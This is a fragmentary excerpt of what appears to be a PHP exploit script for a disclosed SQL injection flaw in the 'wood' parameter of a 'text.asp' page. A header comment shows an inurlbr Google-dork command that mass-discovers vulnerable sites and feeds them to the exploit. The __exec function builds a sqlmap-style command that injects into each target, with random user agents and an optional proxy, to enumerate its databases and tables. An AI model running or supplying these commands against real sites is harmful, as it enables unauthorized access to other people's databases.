...
/*
  ...
  # COMMAND: ./inurlbr.php --dork 'inurl:text.asp?wood=' -s 0dayWebDepo.txt -q 1,6 --exploit-get "?´'0x27" --comand-vul "php WebDepoxpl.php -t '_TARGET_'"
  # DOWNLOAD INURLBR: https://github.com/googleinurl/SCANNER-INURLBR
  -----------------------------------------------------------------------------
  INFO: http://seclists.org/fulldisclosure/2015/Mar/156
 */
...
function __exec($params) {
    ...
    $command = "python {$params['folder']} -u '{$params['target']}/text.asp?wood=1' -p wood --batch --dbms=MySQL {$params['proxy']} --random-agent --answers='follow=N' --dbs --tables";
